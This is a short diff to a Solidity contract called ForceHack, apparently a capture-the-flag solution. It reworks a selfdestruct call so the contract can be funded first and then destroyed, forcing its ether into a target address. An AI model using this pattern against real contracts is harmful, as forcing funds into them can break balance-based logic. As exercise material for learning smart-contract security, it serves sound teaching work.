@@ -3,8 +3,14 @@
 pragma solidity ^0.8.10;
 
 contract ForceHack {
-    constructor(address payable target) payable {
-        require(msg.value > 0);
+    constructor() {}
+
+    function attackContract(address payable target) external payable {
+        // payable(address(target)).call{value: msg.value}("");
         selfdestruct(target);
     }
+
+    receive() external payable {}
+
+    fallback() external payable {}
 }
